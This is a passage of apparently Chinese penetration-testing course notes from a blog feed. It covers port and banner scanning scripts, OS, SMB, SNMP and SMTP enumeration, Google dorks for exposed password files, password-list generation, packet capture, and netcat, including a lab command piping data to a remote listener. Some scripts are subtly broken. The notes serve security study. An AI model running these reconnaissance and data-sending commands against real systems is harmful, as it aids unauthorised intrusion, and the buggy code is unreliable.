class="string">"192.168.1.134"</span>,<span class="number">21</span>))</span><br><span class="line">banner.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="comment"># `220(vsFTPD 2.3.4)\r\n`</span></span><br><span class="line">banner.close()</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><p>Banner不允许抓取，recv函数无返回将挂起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./banner_grab.py [Target-IP] [First Port] [Last Port]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./banner_grab.py 10.0.0.5 1 100"</span>)</span><br><span class="line">    print(<span class="string">"Example will grab banners for TCP ports 1 through 100 on 10.0.0.5"</span>)</span><br><span class="line">    </span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">start = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">end = int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start, end):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        bangrab.connect((ip,port))</span><br><span class="line">        ready=select.select([bangrab],[],[],<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> ready[<span class="number">0</span>]:</span><br><span class="line">            print(<span class="string">"TCP Port"</span> + str(port) + <span class="string">"-"</span> + bangrab.recv(<span class="number">4096</span>))</span><br><span class="line">            bangrab.close()</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>dmitry -p 172.16.36.135</code></p><p><code>dmitry -pb 172.16.36.135</code></p><p><code>nmap -sT 1.1.1.1 -p 1-100 --script=banner.nse</code></p><p><code>amap -B 172.16.36.35 21</code></p><p><code>amap -B 172.16.36.135 1-65535</code></p><p><code>amap -B 172.16.36.135 1-65535 | grep on</code></p><h6 id="服务扫描——服务识别"><a href="#服务扫描——服务识别" class="headerlink" title="服务扫描——服务识别"></a>服务扫描——服务识别</h6><ul><li>Banner信息抓取能力有限</li><li>nmap响应特征分析识别服务<ul><li>发送系列复杂的探测</li><li>依据响应特征signature</li></ul></li><li><code>nc -nv 1.1.1.1 80</code></li><li><code>nmap 1.1.1.1 -p 80 -sV</code></li><li>Amap</li><li><code>amap 192.168.1.134 80</code></li><li><code>amap 172.16.36.135 20-30</code></li><li><code>amap 172.16.36.135 20-30 -q</code></li><li><code>amap 172.16.36.135 20-30 -qb</code></li></ul><h6 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h6><ul><li><p>操作系统识别技术</p><ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul></li><li><p>TTL起始值</p><ul><li>Windows:128(65-128)</li><li>Linux/Unix:64(1-64)</li><li>某些Unix:255 </li></ul></li><li><p>Python</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./ttl_os.py [IP Address]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./ttl_os.py 10.0.0.5"</span>)</span><br><span class="line">    print(<span class="string">"Example will perform ttl analysis to attempt to determine whether the system is Windows or Linux/Unix"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ans=sr1(IP(dst=str(ip))/ICMP(),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> ans==<span class="keyword">None</span>:</span><br><span class="line">    print(<span class="string">"No response was returned"</span>)</span><br><span class="line"><span class="keyword">elif</span> int(ans[IP].ttl)&lt;=<span class="number">64</span>:</span><br><span class="line">    print(<span class="string">"Host is Linux/Unix"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Host is Windows"</span>)</span><br></pre></td></tr></table></figure></li><li><p>nmap</p></li><li><p><code>nmap -O 192.168.1.133</code></p></li><li><p><code>xprobe2 192.168.1.134</code></p></li><li><p>被动操作系统识别</p><ul><li>IDS</li><li>抓包分析</li></ul></li><li><p>被动扫描</p></li><li><p>P0f</p><ul><li>结合ARP地址欺骗识别全网OS</li></ul></li></ul><h6 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h6></li><li><p>snmp</p><ul><li>信息的金矿</li><li>经常被错误配置</li><li>public/private/manager</li></ul></li><li><p>MIB Tree</p><ul><li>SNMP Management Information Base （MIB）</li><li>树形的网络设备管理功能数据库</li><li><code>1.3.6.1.4.1.77.1.2.25</code></li></ul></li><li><p><code>onesixtyone 1.1.1.1 public</code></p></li><li><p><code>onesixtyone -c dict.txt -i hosts -o my.log -w 100</code></p></li><li><p><code>snmapwalk 192.168.1.133 -c public -v 2c</code></p></li><li><p><code>snmapwalk -c public -v 2c 192.168.1.133 1.3.6.1.4.1.77.1.2.25</code></p></li><li><p><code>snmpcheck -t 192.168.1.153</code></p></li><li><p><code>snmpcheck -t 192.168.1.153 -c private -v 2</code></p></li><li><p><code>snmpcheck -t 192.168.20.199 -w</code></p></li></ul></li></ul><h6 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h6><p><code>nmap -v -p139,445 192.168.60.1-20</code></p><p><code>nmap 192.168.60.4 -p139,445 --script=smb-os-discovery.nse</code></p><p><code>nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1</code></p><p><code>nbtscan -r 192.168.60.0/24</code></p><p><code>enum4linux -a 192.168.60.10</code></p><ul><li>Server Message Block 协议<ul><li>微软历史上出现安全问题最多的协议</li><li>实现复杂</li><li>默认开放</li><li>文件共享</li><li>空会话未身份认证访问（SMB1）<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器名</li><li>用户名</li></ul></li></ul></li></ul><h6 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a>SMTP扫描</h6><p><code>nc -nc 1.1.1.1 25</code></p><p><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum=users.methods={VRFY}</code></p><p><code>nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></p><p><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></p><p><code>./smtp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage:smtp.py &lt;username&gt;"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'192.168.20.5'</span>，<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line">print(banner+<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line">s.send(<span class="string">'VRFY'</span> + sys.argv[<span class="number">1</span>]+ <span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line">print(result)</span><br><span class="line">s.close</span><br></pre></td></tr></table></figure><h6 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./FW_detect.py [Target-IP] [Target Port]"</span>)</span><br><span class="line">    print(<span class="string">"Example - /FW_detect.py 10.0.0.5 443"</span>)</span><br><span class="line">    print(<span class="string">"Example will determine if filtering exists on port 443 of host 10.0.0.5"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">ACK_response = sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'A'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">SYN_response = sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'S'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (ACK_response = <span class="keyword">None</span> ) <span class="keyword">and</span> (SYN_response == <span class="keyword">None</span>):</span><br><span class="line">    print(<span class="string">"Port is either unstatefully filtered or host is down"</span>)</span><br><span class="line"><span class="keyword">elif</span>((ACK_response == <span class="keyword">None</span>) <span class="keyword">or</span> (SYN_response == <span class="keyword">None</span>)) <span class="keyword">and</span> <span class="keyword">not</span> ((ACK_response==<span class="keyword">None</span>) <span class="keyword">and</span> (SYN_response == <span class="keyword">None</span>)):</span><br><span class="line">    print(<span class="string">"Stateful filtering in place"</span>)</span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags) == <span class="number">18</span>:</span><br><span class="line">    print(<span class="string">"Port is unfiltered and open"</span>)</span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags) == <span class="number">20</span>:</span><br><span class="line">    print(<span class="string">"Port is unfiltered and closed"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Unable to determine if the port is filtered"</span>)</span><br></pre></td></tr></table></figure><p> Nmap有系列防火墙过滤检测功能</p><p><code>nmap -sA 172.16.36.135 -p 22</code></p><p>负载均衡识别</p><ul><li>广域网负载均衡<ul><li>DNS</li></ul></li><li>HTTP-Loadbalancing<ul><li>Nginx</li><li>Apache</li></ul></li><li>lbd <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></li><li>lbd mail.163.com</li></ul><p>WAF识别</p><ul><li>web应用防火墙</li><li><code>wafw00f -l</code></li><li><code>wafw00f http://www.microsoft.com</code></li><li><code>nmap www.microsoft.com --script=http-waf-detect.nse</code></li></ul><p>NMAP</p><ul><li>所有参数</li><li>zenmap</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>被动信息收集</title>
      <link href="/2018/02/05/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/02/05/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h3 id="第六章-被动信息收集"><a href="#第六章-被动信息收集" class="headerlink" title="第六章 被动信息收集"></a>第六章 被动信息收集</h3><h4 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h4><ul><li><p>公开渠道可获得的信息</p></li><li><p>与目标系统不产生直接交互</p></li><li><p>尽量避免留下一切痕迹</p></li><li><p>OSINT：</p><ul><li>美国军方：<code>http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</code></li><li>北大西洋公约组织：<code>http://information-retrieval.info/docs/NATO-OSINT.html</code></li></ul></li></ul><h4 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h4><ul><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职务</li><li>目标系统使用的技术架构</li><li>公开的商业信息</li></ul><h4 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h4><ul><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul><h4 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h4><ul><li><p>域名解析成IP地址</p><ul><li>域名与FQDN的区别</li><li>域名记录：A(主机记录)、C name（别名记录）、NS（域名服务器记录）、MX（邮件服务器记录）、PTR（反向记录）</li><li>递归查询与迭代查询</li></ul><p>​</p></li></ul><h4 id="DNS——nslookup"><a href="#DNS——nslookup" class="headerlink" title="DNS——nslookup"></a>DNS——nslookup</h4><p>域名服务器地址</p><p>本地缓存服务器</p><p>逐级将CNAME解析为A记录主机再解析为IP地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">www.sina.com</span><br><span class="line"></span><br><span class="line">nslookup</span><br><span class="line">set type=mx</span><br><span class="line">sina.com</span><br><span class="line">server 8.8.8.8  换DNS</span><br><span class="line">set type=any 查询任何记录</span><br><span class="line">nslookup -type=ns example.com 156.154.70.22</span><br></pre></td></tr></table></figure><p>SPF记录</p><h4 id="DNS——DIG"><a href="#DNS——DIG" class="headerlink" title="DNS——DIG"></a>DNS——DIG</h4><ul><li><code>dig @8.8.8.8 www.sina.com mx</code></li><li><code>dig ww.sina.com any</code></li><li><code>dig +noall +answer mail.163.com any</code></li><li>反向查询：<code>dig +noall +answer -x 8.8.8.8</code>   -x </li><li>bind版本信息：<code>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</code></li><li>DNS追踪：<code>dig +trace example.com</code></li></ul><h4 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h4><ul><li>dig @ns1.example.com example.com axfr</li><li>host -T -l sina.com 8.8.8.8</li></ul><h4 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h4><ul><li><code>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt</code></li><li>usr/share/fierce/hosts.txt</li><li><code>dnsdict6 -d4 -t 16 -x sina.com</code></li><li><code>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</code></li><li>dpkg -L dnseum</li><li>find / -name dnseum</li><li><code>dnsmap sina.com -w dns.txt</code></li><li><code>dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt</code></li><li><code>dnsrecon -t std -d sina.com</code></li></ul><h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><ul><li><p>Whois</p></li><li><p><code>whois -h whois.apnic.net 192.0.43.1</code></p></li></ul><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p><em>　公司新闻动态</em>　重要雇员信息<br><em>　机密文档、网络拓扑</em>　用户名密码<br>*　目标系统软硬件技术架构</p><h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h4><ul><li>搜索联网的设备</li><li>Banner: http、ftp、ssh、telnet</li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li><li>常见:filter:<ul><li>net(192.168.20.1)</li><li>city</li><li>country</li><li>port(80\21\22\23)</li><li>os</li><li>Hostname(主机或域名)</li><li>server</li><li><code>country:CN city:beijing port:22</code></li></ul></li></ul><h4 id="GOOGLE搜索"><a href="#GOOGLE搜索" class="headerlink" title="GOOGLE搜索"></a>GOOGLE搜索</h4><ul><li><p>+充值 -支付</p></li><li><p>北京的电⼦子商务公司——北京 intitle:电⼦子商务 intext:法⼈人 intext:电话</p></li><li><p>阿里网站上的北京公司联系⼈人——北京 site:alibaba.com inurl:contact</p></li><li><p>塞班司法案的PDF⽂文档——SOX filetype:pdf</p></li><li><p>法国的⽀支付相关⻚页⾯面——payment site:fr</p></li></ul><h4 id="GOOGLE搜索——实例"><a href="#GOOGLE搜索——实例" class="headerlink" title="GOOGLE搜索——实例"></a>GOOGLE搜索——实例</h4><ul><li><p>inurl:”level/15/exec/-/show”</p></li><li><p>intitle:”netbotz appliance” “ok”</p></li><li><p>inurl /admin/login.php</p></li><li><p>inurl:qq.txt</p></li><li><p>filetype:xls “username | password“</p></li><li><p>inurl:ftp “password” filetype:xls site:baidu.com</p></li><li><p>Service.pwd</p></li><li><p><a href="http://exploit-db.com/google-dorks" target="_blank" rel="noopener">http://exploit-db.com/google-dorks</a></p></li></ul><h4 id="YANDEX"><a href="#YANDEX" class="headerlink" title="YANDEX"></a>YANDEX</h4><p>世界第四⼤大搜索引擎——俄罗斯<br><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></p><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><ul><li>邮件</li><li><code>theharvester -d sina.com -l 300 -b google</code></li><li>文件</li><li><code>metagoofil -d microsoft.com -t pdf -l 200 -o test -f 1.html</code></li></ul><h4 id="MELTAGO"><a href="#MELTAGO" class="headerlink" title="MELTAGO"></a>MELTAGO</h4><h4 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h4><ul><li>社交网络</li><li>工商注册</li><li>新闻组 论坛</li><li>招聘网站</li><li>htttp://<a href="http://www.archive.org/web/web.php" target="_blank" rel="noopener">www.archive.org/web/web.php</a></li></ul><h4 id="生成密码字典"><a href="#生成密码字典" class="headerlink" title="生成密码字典"></a>生成密码字典</h4><ul><li>按个人信息生成其专属的密码字典</li><li>CUPP —— Common User Password Profiler</li><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i</li></ul><h4 id="METADATA"><a href="#METADATA" class="headerlink" title="METADATA"></a>METADATA</h4><ul><li>EXIF </li><li>Foca</li></ul><h4 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><ul><li>web信息搜索框架</li><li>命令格式与msf一致</li><li>基于Python开发</li><li>使用方法：<ul><li>模块</li><li>数据库</li><li>报告</li></ul></li><li>全局选项<ul><li>USER——AGENT</li><li>Proxy</li><li>Workspace</li><li>Snapshot</li></ul></li><li>Show schema</li><li>Help</li><li>Query 数据库</li><li>Select * from hosts where host like ‘%baidu.com%’ order by ip_address</li><li>DNS查询</li><li>解析IP地址</li><li>联系人</li><li>报告</li><li>API</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>网络数据包分析工具</title>
      <link href="/2018/01/29/%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/01/29/%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h4><ul><li>抓包嗅探协议分析</li><li>抓包引擎<ul><li>Libpcap9 – Linux</li><li>Winpcap10 – Windows</li></ul></li><li>解码能力</li></ul><h4 id="Wireshark-基本使用方法"><a href="#Wireshark-基本使用方法" class="headerlink" title="Wireshark 基本使用方法"></a>Wireshark 基本使用方法</h4><ul><li>启动</li><li>选择抓包网卡</li><li>混杂模式</li><li>实时抓包</li><li>保存和分析捕获文件</li><li>首选项</li></ul><p>开启混杂模式，抓取所有数据包。</p><ul><li><p>抓包筛选器</p><p>ip 192.168.0.1 只抓取一个IP地址的数据包</p></li></ul><h4 id="Wireshark–-常见协议包"><a href="#Wireshark–-常见协议包" class="headerlink" title="Wireshark– 常见协议包"></a>Wireshark– 常见协议包</h4><ul><li><p>ARP</p></li><li><p>SSDP</p><p>就不列举了，需要单独花一些时间仔细研究一下常见协议的网络包</p></li></ul><h4 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h4><p>Wireshark是按端口来区分协议的，所以如果没有用常用端口的协议，可以手动更改一下解析方式。</p><p>通过数据流查看方式查看类似html流量</p><p>通过ssl证书加密协议就无法识别内容了，但是在开头还是有明文证书信息，虽然没什么用。</p><h3 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h3><ul><li>No-GUI 的抓包分析工具</li><li>Linux\ Unix系统默认安装</li></ul><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><ul><li>默认只抓68个字节</li><li><code>tcpdump -i eth0 -s 0 -w file.pcap</code> -s 0 有多大抓多大</li><li><code>Tcpdump -i eth0 port 22</code> 抓22端口</li><li>读取抓包文件<code>Tcpdump -r file.pcap</code> -X 16进制显示</li></ul><h4 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h4><p><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -U</code></p><p>-n 不解析域名 -r 读取文件 筛选第三列 去除重复项</p><p><code>tcpdump -n src host 145.254.160.237 -r http.cap</code></p><p>筛选源IP</p><p><code>tcpdump -n dst host 145.254.160.237 -r http.cap</code></p><p>筛选目标IP</p><p><code>tcpdump -n port 53 -r http.cap</code></p><p>按端口号筛选</p><p><code>tcpdump -nX port 80 -r http.cap</code></p><p>以十六进制显示数据包</p><h4 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h4><p><code>tcpdump -A -n &#39;tcp[13] = 24&#39; -r http.cap</code></p><h3 id="过程文档记录"><a href="#过程文档记录" class="headerlink" title="过程文档记录"></a>过程文档记录</h3><ul><li>Dradis<ul><li>短期临时小团队资源共享</li><li>各种插件导入文件</li></ul></li><li>Keepnot</li><li>Truecrypt</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>NETCAT</title>
      <link href="/2018/01/29/Netcat/"/>
      <url>/2018/01/29/Netcat/</url>
      
        <content type="html"><![CDATA[<ul><li>Nc</li><li>Wireshark</li><li>Tcpdump</li></ul><h4 id="NC-简介"><a href="#NC-简介" class="headerlink" title="NC 简介"></a>NC 简介</h4><ul><li>身材小巧，能力强</li><li>侦听模式\传输模式</li><li>telent/获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所有流量</li><li>流媒体服务器</li><li><p>远程克隆硬盘</p><h4 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET/BANNER"></a>NC——TELNET/BANNER</h4></li><li><p><code>nc -nv 1.1.1.1 110</code></p></li><li><p><code>nc -nv 1.1.1.1 25</code></p></li><li><p><code>nc -nv 1.1.1.1 80</code></p></li><li><p><code>nc -h</code> 查询参数使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[v1.10-41.1]</span><br><span class="line">connect to somewhere:nc [-options] hostname port[s] [ports] ... </span><br><span class="line">listen for inbound:nc -l -p port [-options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">-c shell commandsas `-e&apos;; use /bin/sh to exec [dangerous!!]</span><br><span class="line">-e filenameprogram to exec after connect [dangerous!!]</span><br><span class="line">-ballow broadcasts</span><br><span class="line">-g gatewaysource-routing hop point[s], up to 8</span><br><span class="line">-G numsource-routing pointer: 4, 8, 12, ...</span><br><span class="line">-hthis cruft</span><br><span class="line">-i secsdelay interval for lines sent, ports scanned</span><br><span class="line">        -k                      set keepalive option on socket</span><br><span class="line">-llisten mode, for inbound connects</span><br><span class="line">-nnumeric-only IP addresses, no DNS</span><br><span class="line">-o filehex dump of traffic</span><br><span class="line">-p portlocal port number</span><br><span class="line">-rrandomize local and remote ports</span><br><span class="line">-q secsquit after EOF on stdin and delay of secs</span><br><span class="line">-s addrlocal source address</span><br><span class="line">-T tosset Type Of Service</span><br><span class="line">-tanswer TELNET negotiation</span><br><span class="line">-uUDP mode</span><br><span class="line">-vverbose [use twice to be more verbose]</span><br><span class="line">-w secstimeout for connects and final net reads</span><br><span class="line">-CSend CRLF as line-ending</span><br><span class="line">-zzero-I/O mode [used for scanning]</span><br><span class="line">port numbers can be individual or ranges: lo-hi [inclusive];</span><br><span class="line">hyphens in port names must be backslash escaped (e.g. &apos;ftp\-data&apos;).</span><br></pre></td></tr></table></figure><p><code>-v</code> 显示详细连接信息</p><p><code>n</code> 不做DNS解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping pop3.163.com</span><br><span class="line">nc -vn 220.181.12.110 110</span><br><span class="line">(UNKNOWN) [220.181.12.110] 110 (pop3) open</span><br><span class="line">+OK Welcome to coremail Mail Pop3 Server (163coms[b62aaa251425b4be4eaec4ab4744cf47s])</span><br></pre></td></tr></table></figure><p><code>base64</code></p><p><code>邮箱地址</code></p><p>Ctrl+D</p><p><code>USER base64地址</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping smtp.163.com</span><br><span class="line">nc -vn 220.181.12.16</span><br><span class="line">ehlo 用户名</span><br><span class="line">AUTH LOGIN  不用BASE64</span><br></pre></td></tr></table></figure><p>​</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 10.10.10.129 80</span><br><span class="line">get </span><br><span class="line">head</span><br></pre></td></tr></table></figure><p>​</p></li></ul><h4 id="NC——-传输文本信息"><a href="#NC——-传输文本信息" class="headerlink" title="NC—— 传输文本信息"></a>NC—— 传输文本信息</h4><p>开了两台虚拟机</p><p>A:nc -l -p 4444</p><p>打开侦听端口</p><p>B:nc -nv 1.1.1.1 4444</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 333</span><br><span class="line">netstat -pantu | grep 333 查看端口是否开启</span><br><span class="line">另一台机器</span><br><span class="line">nc -nv 10.10.10.133 333</span><br></pre></td></tr></table></figure><p>远程信息收集</p><p><code>ls -l | nc -nv 10.10.10.133</code></p><p>可以在远端电脑上</p><p><code>nc -l -p 333 &gt; 